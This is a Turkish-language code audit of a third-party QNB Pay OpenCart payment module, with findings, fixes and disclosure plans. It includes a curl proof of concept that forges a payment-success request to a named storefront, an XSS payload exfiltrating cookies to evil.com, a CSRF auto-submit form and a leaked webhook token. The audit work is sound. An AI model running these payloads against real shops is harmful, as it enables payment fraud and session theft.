# QNB Pay Modülü — Güvenlik Audit Raporu

> **Tarih:** 2026-05-12
> **Geliştirici:** bolkarco (3. taraf)
> **Modül dosyaları:**
> - `catalog/controller/extension/payment/qnbpay.php` (38 KB, 793 satır)
> - `system/library/qnbpay.php` (37 KB, 1028 satır)
> - `admin/controller/extension/payment/qnbpay.php` (10 KB)
> - `admin/model/extension/payment/qnbpay.php` (9 KB)
> - `catalog/model/extension/payment/qnbpay.php` (1.5 KB)
> - JS dosyaları: `qnbpay.js`, `qnbpay-script.js`, `qnbpay-imask.js` (toplam ~180 KB)
>
> **Yöntem:** Yerel kopyada (`~/raven-dental/code/`) **read-only** kod analizi. Üretime dokunulmadı.

---

## YÖNETİCİ ÖZETİ

Bolkarco'nun raporladığı 4 bulgudan **3'ü doğrulandı**, 1'i kısmen doğrulandı:

| Bolkarco İddiası | Doğrulama | Severity |
|---|---|---|
| CSRF koruması eksik | ⚠️ Kısmen — OpenCart genel sorunu | MEDIUM |
| Input validation yetersiz | ✅ **DOĞRULANDI** — Critical | **CRITICAL** |
| Webhook güvenliği zayıf | ✅ **DOĞRULANDI** — Token URL'de, plaintext | HIGH |
| SQL Injection riski | ❌ Yanlış — escape() iyi uygulanmış | - |
| (Ek) IDOR / my orders | ⚠️ Bağlama bağlı — QNB API'sine bağlı | MEDIUM |

**Toplam bulgu sayısı:** 12 (3 Critical, 5 High, 3 Medium, 1 Low) + 4 Good

---

## 🔴 CRITICAL #1 — validation() Hash Kontrolü Devre Dışı

**Dosya:** `catalog/controller/extension/payment/qnbpay.php`
**Satır:** 587-673 (`validation()` method)

### Kod
```php
public function validation()
{
    // ...
    $p = $this->request->post;
    $hashControl = 0;  // ← DEVRE DIŞI!
    if ($hashControl) {
        $x = qnbpay::validateHashKey($this->request->get['hash_key'], ...);
        if (($x[0] != $this->request->get["qnbpay_status"]) or ...) {
            // Hash uyumsuz hatası
        }
    }

    // Status code kontrolü - POST veya GET'ten gelebilir
    $status_code = $this->request->post["status_code"] ?? $this->request->get["status_code"] ?? '';
    
    if ($status_code != '100') {
        $error_msg = "Ödeme İşlemi Tamamlanamadı.";
        // ... redirect
        return;
    }

    // status_code == '100' ise:
    $this->model_checkout_order->addOrderHistory(
        $order_id, 
        $this->config->get('payment_qnbpay_order_status_id'),  // genelde "Complete" status
        "Kredi Kartı Ödeme Başarılı", 
        false
    );
    $this->response->redirect($this->url->link('checkout/success', '', true));
}
```

### Risk
`$hashControl = 0` ile **hash doğrulama TAMAMEN devre dışı**. Bu, çok kritik bir tasarım hatası:

**Saldırı senaryosu:**
1. Saldırgan checkout flow'unu başlatır, kendi sepeti için order_id alır (örn. order_id=12345)
2. Saldırgan kart bilgisi yerine **direkt** `https://ravendentalgroup.com/index.php?route=extension/payment/qnbpay/validation` URL'sine POST atar
3. POST body: `status_code=100&invoice_id=12345_XXX&amount=1000&currency=TRY`
4. Sistem hash kontrolü yapmadığı için bu request'i "ödeme başarılı" sayar
5. Order history "Kredi Kartı Ödeme Başarılı" yazılır
6. `addOrderHistory` ile sipariş statusu "complete"e geçer (eğer `payment_qnbpay_order_status_id` complete'e set'liyse)
7. Sistem siparişi onaylar, **ÖDEME YAPILMADAN**

**Defense-in-depth eksik:** `webhook()` metodunda `checkStatus()` ile QNB API'ye tekrar soruluyor ama `validation()`'da bu yok. Saldırgan webhook beklemeden doğrudan validation()'ı tetikleyebilir.

### PoC (test edilecek — üretime dokunulmadı)
```bash
# 1. Session başlat, gerçek bir order_id elde et (gerçek sipariş gerek değil — sadece order_id)
# 2. Saldırı:
curl -X POST "https://ravendentalgroup.com/index.php?route=extension/payment/qnbpay/validation" \
  -b "OCSESSID=<senin_session>" \
  -d "status_code=100&invoice_id=12345_TEST&amount=1.00&currency=TRY"
# 3. Order history kontrolü → "Kredi Kartı Ödeme Başarılı" yazılmış mı?
```

### Önerilen Düzeltme
```php
// $hashControl = 0;  // YASAK
// Hash kontrolünü ZORUNLU yap:
$hashKey = $this->request->get['hash_key'] ?? '';
if (empty($hashKey)) {
    // Sahte istek
    http_response_code(400);
    $this->session->data['error'] = "Geçersiz ödeme yanıtı.";
    $this->response->redirect($this->url->link('checkout/checkout', '', true));
    return;
}

$x = qnbpay::validateHashKey($hashKey, $this->config->get('payment_qnbpay_app_secret'));
if ($x[0] != $this->request->get["qnbpay_status"] || $x[2] != $this->request->get["invoice_id"]) {
    $this->session->data['error'] = "Ödeme doğrulanamadı.";
    $this->response->redirect($this->url->link('checkout/checkout', '', true));
    return;
}

// EK: defense in depth — QNB API'ye de soralım
$statusResult = $qnbpay->checkStatus($order_id);
if (($statusResult['status_code'] ?? 0) != 100) {
    $this->session->data['error'] = "Ödeme doğrulanamadı.";
    $this->response->redirect($this->url->link('checkout/checkout', '', true));
    return;
}
```

---

## 🔴 CRITICAL #2 — deletemycard XSS + Open Redirect

**Dosya:** `catalog/controller/extension/payment/qnbpay.php`
**Satır:** 765-793 (`deletemycard()` method)

### Kod
```php
public function deletemycard()
{
    $this->qnbpay = new qnbpay(...);
    $cardToken = $this->request->get['card_token'];
    $customer_id = $this->customer->isLogged() ? $this->customer->getId() : 0;
    $this->qnbpay->deleteStoredCard($cardToken, $customer_id);

    $redirectHtml = '<script>
        setTimeout(function(){
            window.location.href = "' . $_SERVER['HTTP_REFERER'] . '"
        }, 1000);
    </script>';

    die($redirectHtml);
}
```

### Risk
`$_SERVER['HTTP_REFERER']` doğrudan inline JavaScript'e ekleniyor. Sanitization YOK.

**XSS saldırı:**
- Saldırgan kurban'ı kendi sitesinden link'le tetikler
- Saldırgan sitesi:
  ```html
  <a href="https://ravendentalgroup.com/index.php?route=extension/payment/qnbpay/deletemycard&card_token=X">Tıkla</a>
  ```
- Sayfa için Referer header'ı tam URL olur
- Eğer Referer URL'ini saldırgan kontrol ederse (kendi sitesi), URL'de JavaScript injection mümkün

**Daha gerçekçi XSS:** Saldırgan kendi sitesinde:
```html
<base href='";document.location="http://evil.com/?c="+document.cookie;//'>
<a href="https://ravendentalgroup.com/index.php?route=extension/payment/qnbpay/deletemycard">Tıkla</a>
```

**Open redirect:** Saldırgan kurban'ı phishing sayfasına yönlendirebilir.

### Önerilen Düzeltme
```php
// HTTP_REFERER YASAK — kontrollü redirect kullan
$redirect = $this->url->link('account/account', '', true);
$this->response->redirect($redirect);
```

Veya HTTP_REFERER kullanılacaksa:
```php
$referer = $_SERVER['HTTP_REFERER'] ?? '';
// Sadece kendi domain'imize izin ver
$host = $_SERVER['HTTP_HOST'];
if (!preg_match('#^https?://' . preg_quote($host) . '/#', $referer)) {
    $referer = $this->url->link('account/account', '', true);
}
$this->response->redirect($referer);  // header redirect — JS gerek yok
```

---

## 🔴 CRITICAL #3 — Kart Bilgileri Merchant Sunucudan Geçiyor (PCI DSS Scope)

**Dosya:** `catalog/controller/extension/payment/qnbpay.php`
**Satır:** ~480-520 (`process()` method)

### Kod
```php
$pan = str_replace(' ', '', $this->request->post['pan']);
list($ay, $yil) = explode('/', $this->request->post['expirationdate']);
$qnbpay->card = [
    "owner" => $this->request->post['cardOwner'],
    "pan"   => $pan,           // ← KART NUMARASI
    "month" => $ay,
    "year"  => $yil,
    "cvc"   => $this->request->post['cvv']  // ← CVV
];
```

### Risk
**PCI DSS perspektifi:**
- Kart numarası (PAN) + expiry + CVV — hepsi `$_POST` ile merchant sunucuya geliyor
- Bu, merchant'i **PCI DSS scope**'a sokar
- Eğer kart bilgisi loglanır, cache'lenir veya DB'ye yazılırsa: **SAQ D-MER (full PCI)** zorunlu
- Türkiye için: BDDK & SPK regülasyonları

**Karşılaştırma — daha iyi pattern'ler:**
1. **Hosted Iframe (PCI scope dışı):** QNB Pay sayfası iframe'de gösterilir, kullanıcı kartı QNB'nin sunucusuna girer
2. **Redirect to QNB (PCI scope dışı):** Kullanıcı QNB'ye redirect olur, ödeme orada
3. **JavaScript Tokenization:** Frontend JS kartı QNB'ye gönderir, geri sadece token döner

**Bu modülün şu anki yaklaşımı:** Direct API (PCI scope IÇINDE)

### Kontrol gerekli
1. **Error log'da kart bilgisi var mı?** — `~/raven-dental/code/` içinde grep:
   ```bash
   grep -rn "error_log.*pan\|error_log.*\$pan\|file_put_contents.*pan" code/
   ```
2. **DB'ye saklanıyor mu?** — `oc_qnbpay_transactions` tablosunda PAN/CVV kolonu YOK (model'i okuduğum kadarıyla — sadece transactionId, reference, message, code).
3. **`storeCard` opsiyonu** — kullanıcı "kartımı kaydet" tıklarsa, kart QNB'ye gönderilir, geri token döner. **Bizim DB'de PAN saklanmıyor** ✓ (QNB tokenize ediyor).

### Önerilen Düzeltme (uzun vadeli)
**Modülü "Hosted Page" veya "iframe" modeline çevir.** Frontend JS kartı direkt QNB Pay'e iletsin, server-side `$_POST['pan']` görmesin.

Kısa vadeli (mevcut akış):
- PHP error_log'da kart bilgisi sızıntısı olmadığını doğrula
- DB'de hiçbir tabloda PAN/CVV alanı olmadığını doğrula
- Server access log'larında POST body görünmediğini doğrula

---

## 🟠 HIGH #4 — Webhook Token URL Parametresinde

**Dosya:** `catalog/controller/extension/payment/qnbpay.php`
**Satır:** 673-685 (`webhook()` method başı)

### Kod
```php
$p = $this->request->get + $this->request->post;

if (!isset($p['token']) || trim($this->config->get('payment_qnbpay_token')) != trim($p['token'])) {
    http_response_code(401);
    die("401 Unauthorized");
}
```

### Risk
1. **Token URL query string'inde:** `?token=QYPlOr1j9X`
   - **Sızıntı yolları:**
     - Web server access log'unda plaintext
     - Browser history
     - Referer header (eğer QNB callback page'inde başka link varsa)
     - Cache layers (CDN, CF, vb.)
2. **Token zayıf:** DB dump'tan `QYPlOr1j9X` görüldü — **10 karakter** ve karmaşıklık düşük. Brute-force edilebilir.
3. **HMAC değil:** Sabit token (statik), her isteği authenticate eder ama imza yok.

### Saldırı senaryosu
- Saldırgan webhook URL'ini ve token'ı öğrenir (Referer log, GitHub leak, vb.)
- Sahte webhook tetikler: `?token=QYPlOr1j9X&invoice_id=12345_X&do=sale`
- ✓ İyi yan: kod `checkStatus()` ile QNB'ye soruyor (saldırı kısmen mitigate)
- ❌ Kötü yan: Eğer saldırgan kendi order_id'sine yazıyorsa, history "ödendi" yazar

### Önerilen Düzeltme
1. Token uzunluğu en az 32 karakter, random
2. **HMAC signature** kullan (header'da):
   ```php
   $payload = file_get_contents('php://input');
   $signature = $_SERVER['HTTP_X_QNB_SIGNATURE'] ?? '';
   $expected = hash_hmac('sha256', $payload, $sale_web_hook_key);
   if (!hash_equals($expected, $signature)) {
       http_response_code(401);
       die("401");
   }
   ```
3. QNB Pay'in sunduğu signature mechanism varsa onu kullan

---

## 🟠 HIGH #5 — recurringCancel() Boş Method

**Dosya:** `catalog/controller/extension/payment/qnbpay.php`
**Satır:** 13-17

### Kod
```php
public function recurringCancel()
{
    return "";
}
```

### Risk
Recurring (tekrarlı) ödeme iptali için endpoint var ama HİÇBİR ŞEY YAPMIYOR. 

- Müşteri "aboneliğimi iptal et" tıkladığında bu çağrılır
- Method boş → iptal **DB'de işaretlenmiyor**, **QNB API'ye gönderilmiyor**
- Sonuç: Müşteri iptal etti sanır, **ödeme tahsil edilmeye devam eder**

Tüketici hakkı + yasal sorun.

### Önerilen Düzeltme
recurring iptal mantığı eklenmeli — DB'de status update + QNB API call.

---

## 🟠 HIGH #6 — Webhook'ta `recurring` Tipi `checkStatus` İle Doğrulanmıyor

**Dosya:** `catalog/controller/extension/payment/qnbpay.php`
**Satır:** ~720-740 (webhook içinde)

### Kod
```php
} elseif ($this->request->get['do'] == 'recurring') {
    // Tekrarlı ödeme webhook
    if (isset($p['status_code']) && $p['status_code'] == '100') {
        $this->model_checkout_order->addOrderHistory(...);
    }
}
```

Burada `$p` ya doğrudan webhook'tan ya da `checkStatus()`'tan geliyor. Ama logic flow'a bakınca, `checkStatus` üst kısımda **tüm tipleri için çağrılıyor** ✓. Yine de bu kısımda doğrudan `$p['status_code']` güveniliyor — checkStatus tutarsızsa risk.

### Önerilen Düzeltme
`checkStatus` sonucundan `transaction_type=recurring` mi kontrol et.

---

## 🟠 HIGH #7 — paymentid rand() Cryptographically Weak

**Dosya:** `catalog/controller/extension/payment/qnbpay.php`
**Satır:** ~470

### Kod
```php
$qnbpay->paymentid = $this->session->data['order_id'] . "-" . date('dmY') . "-" . rand(100, 999);
```

### Risk
- `rand()` cryptographically weak
- Saldırgan order_id + date'i bilirse, 100-999 arası brute-force trivial
- paymentid başka kontrollerde kullanılıyorsa risk

### Önerilen Düzeltme
```php
$qnbpay->paymentid = $this->session->data['order_id'] . "-" . date('dmY') . "-" . random_int(100000, 999999);
```

---

## 🟠 HIGH #8 — IDOR Riski deletemycard (QNB API'ye Bağlı)

**Dosya:** `catalog/controller/extension/payment/qnbpay.php` satır 765+
**Library:** `system/library/qnbpay.php` satır 896+

### Kod (controller)
```php
$cardToken = $this->request->get['card_token'];
$customer_id = $this->customer->isLogged() ? $this->customer->getId() : 0;
$this->qnbpay->deleteStoredCard($cardToken, $customer_id);
```

### Kod (library)
```php
public function deleteStoredCard($card_token, $customer_number)
{
    // QNB API'ye gönder
    $requestParams = [
        'merchant_key' => ...,
        'card_token' => $card_token,
        'customer_number' => $customer_number,
        'hash_key' => $this->generateHashKey([$this->merchant_key, $customer_number, $card_token], $this->app_secret),
    ];
    // POST /ccpayment/api/deleteCard
}
```

### Risk
- `card_token`, kullanıcının kontrolü altında (URL parametresi)
- `customer_id` doğru gelir (session'dan)
- **QNB API tarafında** `card_token` ile `customer_number`'ın gerçekten eşleştiği kontrol ediliyor mu? Bilinmiyor.
- Eğer QNB tarafı kontrol etmiyorsa: A kullanıcısı, B kullanıcısının card_token'ını öğrenirse silebilir.

Ayrıca **misafir kullanıcı** (customer_id=0) `deletemycard?card_token=XYZ` çağrısı yapabiliyor — neden allowed?

### Önerilen Düzeltme
1. Login zorunlu (`!$this->customer->isLogged()` → reddet)
2. `card_token` server-side validation: kullanıcı'ya ait olduğunu yerel DB ile teyit et (eğer token'lar yerelde saklanıyorsa)
3. CSRF token ekle (POST request + token)
4. QNB Pay dokümantasyonundan eşleşme garantisi olduğunu doğrula

---

## 🟡 MEDIUM #9 — CSRF Koruması Yok (Genel Sorun)

**Dosya:** Tüm POST endpoint'leri (`process()`, `deletemycard()`, vb.)

### Risk
OpenCart 3.x default'ta CSRF token YOK. Tüm POST formları `Referer` veya `Origin` kontrolü olmadan kabul ediliyor.

**Saldırı:**
- Saldırgan sayfa hazırlar:
  ```html
  <form action="https://ravendentalgroup.com/index.php?route=extension/payment/qnbpay/process" method="POST">
    <input name="pan" value="...">
    ...
  </form>
  <script>document.forms[0].submit()</script>
  ```
- Kurban siteye login'liyken bu sayfayı ziyaret ederse, sahte ödeme başlatılabilir

### Önerilen Düzeltme
Tüm form'lara CSRF token ekle:
```php
// Form generate'te:
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';

// Form receive'da:
if (!hash_equals($_SESSION['csrf_token'] ?? '', $_POST['csrf_token'] ?? '')) {
    die('CSRF token invalid');
}
```

---

## 🟡 MEDIUM #10 — cardOwner XSS Riski (Reflected)

**Dosya:** `catalog/controller/extension/payment/qnbpay.php`
**Satır:** ~487

### Kod
```php
"owner" => $this->request->post['cardOwner'],
```

### Risk
`cardOwner` kullanıcıdan geliyor ve QNB Pay'e gönderiliyor. Eğer error sayfası veya order detail view'da bu değer ham olarak gösteriliyorsa: XSS.

→ View dosyasında kontrol gerek (`qnbpay.twig`, `qnbpay_execution.twig`).

### Önerilen Düzeltme
View'da `{{ cardOwner | e }}` Twig escape; PHP'de `htmlspecialchars($value, ENT_QUOTES)`.

---

## 🟡 MEDIUM #11 — debug=1 Production'da Açılırsa Veri Sızıntısı

**Dosya:** `system/library/qnbpay.php`
**Satır:** çeşitli (`if ($this->debug) { dump(...); exit; }`)

### Risk
Library'de bolca `dump()` çağrısı var, `$debug` true ise tam request/response dökülür — kart bilgisi dahil.

```php
if ($qnbpay->debug == '1') {
    //dump($actionStoreCard);exit;
}
```

Bazı yerlerde yorum, ama bazı yerlerde aktif. Admin'den `payment_qnbpay_debug` yanlışlıkla açılırsa kart bilgisi browser'a dökülür.

### Önerilen Düzeltme
- Production'da `$debug=false` hardcoded
- Debug mode için ayrı log dosyası, kart bilgisi mask'lansın
- `dump($card)` → `dump(array_diff_key($card, ['pan'=>'', 'cvc'=>'']))`

---

## 🟢 GOOD #1 — SQL Injection Koruma İyi

**Dosya:** `catalog/model/extension/payment/qnbpay.php`

### Kod
```php
$this->db->query("INSERT INTO `" . DB_PREFIX . "qnbpay_transactions` SET 
    `order_id` = '" . (int)$transaction_data['order_id'] . "',
    `status` = '" . $this->db->escape($transaction_data['status']) . "',
    ...
");
```

`(int)` cast + `$this->db->escape()` doğru kullanılmış. SQL injection riski YOK ✓.

---

## 🟢 GOOD #2 — Webhook Defense-in-depth (checkStatus)

`webhook()` metodunda QNB API'ye tekrar `checkStatus()` ile soruluyor. Sahte webhook payload'una güvenilmiyor ✓.

(Ama `validation()` metodunda bu eksik — Critical #1)

---

## 🟢 GOOD #3 — Card Storage QNB'de, DB'de PAN Yok

`storeCard` çağrısı kartı QNB Pay'in vault'una gönderir, geri `card_token` döner. Yerel DB'de PAN saklanmıyor (model'i okudum). PCI DSS açısından iyi pattern ✓.

---

## 🟢 GOOD #4 — SSL Verify Production'da Açık

```php
if ($this->env == 'test') {
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  // test
} else {
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);   // production ✓
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
}
```

Production'da TLS doğrulama açık ✓.

---

## Sonuç ve Öncelik Sırası

### 🔴 ACIL DÜZELT (Production'da fraud riski)
1. **#1 validation() hash kontrolünü aktive et** — `$hashControl = 1` + ek `checkStatus` defense
2. **#2 deletemycard XSS** — `HTTP_REFERER` JS injection
3. **#5 recurringCancel()** — boş method (yasal/tüketici sorunu)

### 🟠 YAKIN VADELI (1 hafta)
4. **#4 Webhook HMAC** — token URL'den header'a, HMAC kullan
5. **#7 paymentid `random_int()`**
6. **#8 deletemycard login zorunlu + CSRF**
7. **#9 CSRF token genel** — tüm POST endpoint'lerine

### 🟡 ORTA VADELI (1 ay)
8. **#3 PCI DSS scope** — hosted iframe veya tokenization değerlendir
9. **#10 cardOwner sanitize**
10. **#11 debug mode hardening**

### Test gerek
- Error log'da kart bilgisi var mı? (üretimde grep)
- DB tablolarında PAN kolonu var mı? (oc_qnbpay_transactions schema)
- recurring subscriber'lar nasıl iptal ediyor?
- QNB Pay deleteCard API'sinde customer_id-card_token eşleşmesi enforce edilir mi?

---

## Eğer Düzeltme Yapılırsa

**Strateji:**
1. **bolkarco'ya bu raporu paylaş** — kendi modülü, kendisinin düzeltmesi mantıklı
2. **Test ortamında** uygula (test.ravendentalgroup.com veya sandbox)
3. PoC saldırı testleri yap (özellikle validation() hash bypass)
4. Production'a "tek seferde" deploy et (10-dakika maintenance window)
5. Smoke test: 1 gerçek sipariş ile test (sandbox kart)
6. 24 saat izle, sipariş tamamlanma oranı düşmediyse OK

**Risk yönetimi:**
- Şu anki açıklar **bilen birinin** istismarı gerektiriyor (kod public değil)
- Ama bolkarco veya benzeri 3. taraf erişen var
- Üretim trafiği düşükse fraud denemesi de düşük olabilir
- Yine de "race against time" — düzeltme kısa vadede yapılmalı

---

## Bu Audit'in Kapsamı Dışı

- JS dosyalarının (qnbpay-script.js 99 KB) detaylı incelemesi
- Admin tarafının tüm method'ları (admin/controller/extension/payment/qnbpay.php)
- QNB Pay sunucu tarafı (3. taraf, audit yetkisi yok)
- Penetration testing PoC'leri (sadece kod analizi)
- KVKK/PCI DSS uyumluluk değerlendirmesi (hukuk danışmanı)

---

## EK ANALİZ: QNB Pay Resmi Modülü vs Bolkarco Versiyonu

QNB Pay resmi OpenCart modülünü indirdik (`https://apidocs.qnbpay.com.tr/files/OpenCart_QNBpay.zip`, 120 KB) ve karşılaştırdık.

### Dosya boyut karşılaştırması

| Dosya | Resmi (satır) | Bolkarco (satır) | Fark |
|---|---|---|---|
| catalog/controller/.../qnbpay.php | 598 | 798 | **+200** |
| system/library/qnbpay.php | 830 | 1028 | **+198** |
| catalog/model/.../qnbpay.php | 41 | 41 | 0 |
| admin/controller/.../qnbpay.php | 232 | 232 | 0 |
| admin/model/.../qnbpay.php | 217 | 217 | 0 |

**Sonuç:** Bolkarco controller'a ~200 satır + library'e ~200 satır eklemiş. Diğer dosyalara dokunmamış.

### 📌 Önemli Bağlam — Kullanıcı Açıklaması

> "QNB Pay'in modülü çalışmıyordu, bolkarco düzeltti."

Yani bolkarco, sıfırdan ödeme modülü YAZMADI — **QNB'nin bozuk resmi modülünü ÇALIŞIR HALE GETİRDİ.** Bolkarco bir 3. taraf güvenlik tehdidi değil, tam tersine bug-fixer kahraman rolünde.

Aşağıdaki "DÜZELTME" yorumları bunu doğruluyor.

### Bolkarco'nun YAPTIĞI Düzeltmeler (POZİTİF)

Kod içinde "DÜZELTME" yorumlarıyla işaretlenmiş:

1. **DÜZELTME 1 (line 112):** `index()` içinde **misafir kullanıcı kontrolü** eklendi
   - Token alma başarısız olursa form'u yine de gösterir
   - Resmi kodda: token başarısız → hata; bolkarco: graceful degradation
   
2. **DÜZELTME 2 (line 478):** `process()` içinde **`customer_id` log hatası** düzeltildi
   - Resmi kod: `$customer_id` hiç tanımlanmıyor → "Undefined variable" notice
   - Bolkarco: `$customer_id = $this->customer->isLogged() ? $this->customer->getId() : 0;`

3. **DÜZELTME 3 (line 780):** `deletemycard()` içinde **session field düzeltmesi**
   - Resmi kod: `$this->session->data['user_id']` (admin field, müşteri için **HER ZAMAN NULL**)
   - Bolkarco: `$this->customer->isLogged() ? $this->customer->getId() : 0`
   - Bu çok ciddi bir resmi kod bug'ı — bolkarco düzeltmiş

4. **Genel iyileştirmeler:**
   - `process()` içinde sepet/oturum kontrolleri (resmi kodda yok)
   - `ajax()` içinde graceful fallback (token alınamazsa peşin göster)
   - Error handling iyileştirilmiş

### Bolkarco'nun DÜZELTMEDİĞİ Sorunlar (NEGATİF / Miras)

Bolkarco'nun versiyonunda KALAN ama QNB resmi kodundan **gelen** sorunlar:

1. **🔴 CRITICAL #1: `$hashControl = 0`** — QNB resmi modülünde de **devre dışı**. Bolkarco kasten bırakmış mı yoksa fark etmemiş mi belirsiz. **Kod bug'ı** (development sırasında kapalı bırakılmış olabilir).

2. **🔴 CRITICAL #2: HTTP_REFERER XSS** — QNB resmi kodunda da var, bolkarco aynen bırakmış.

3. **🟠 HIGH #4: Webhook token URL'de** — QNB resmi tasarım kararı.

4. **🟠 HIGH #5: recurringCancel() boş** — QNB resmi kodunda da boş (`return "";`).

### YORUM

Bu **kötü bir tablo** çünkü:
- QNB Pay'in **resmi** OpenCart modülü, ödeme güvenliğinin temel kuralı olan hash doğrulamayı **devre dışı** dağıtıyor
- HTTP_REFERER ile inline JS injection — basic XSS hijyeni eksik
- recurringCancel boş bir method — yasal/tüketici sorunu (tahsil edilmeye devam edecek aboneliği iptal edemez)

**Bu, sadece "Raven Dental" sitesi değil, QNB Pay'i kullanan TÜM OpenCart mağazaları için risk.** Türkiye'de yüzlerce site etkilenebilir.

### Tavsiyeler

1. **bolkarco'ya yaz:** "QNB Pay'in resmi modülünden gelen 3 kritik açığı ekibinize bildirir misiniz? Özellikle `$hashControl = 0` ve HTTP_REFERER XSS. Düzeltme önerilerini birlikte uygulayabiliriz."

2. **QNB Pay'e responsible disclosure:** Resmi modülde hash bypass + XSS — QNB güvenlik ekibine bildirilmeli. Bizim için riski azaltır.

3. **Site bazında düzeltme:** bolkarco beklerken yerelde patch hazırla, test ortamında dene, sonra üretime uygula (tek seferde, 10 dakika maintenance).

### Resmi vs Bolkarco — Hangisi Daha Güvenli?

Bolkarco'nun versiyonu **daha güvenli** (ironik bir şekilde):
- Misafir kullanıcı NULL bug'ları düzeltilmiş
- Graceful degradation eklenmiş
- Error handling sıkılaştırılmış

Ama her ikisi de **temel açıkları** (hash bypass, XSS) içeriyor. Bolkarco onları görmemiş veya QNB'nin tasarımı sanmış.

### Sonraki Adımlar (Faz 2'de)

- [ ] Resmi vs bolkarco tam diff'i `analysis/qnb-diff-official-vs-current.txt`'e yaz
- [ ] Bolkarco'nun değer kattığı 200 satırı listele
- [ ] Hash bypass için QNB Pay support'a sor (resmi mi tasarım, bug mu?)
- [ ] PoC saldırı script'i hazırla (test ortamında — üretime atma)
- [ ] Yamaları yerel kopyada yaz, branch'le saklı tut
- [ ] bolkarco'ya rapor + öneri paketi gönder
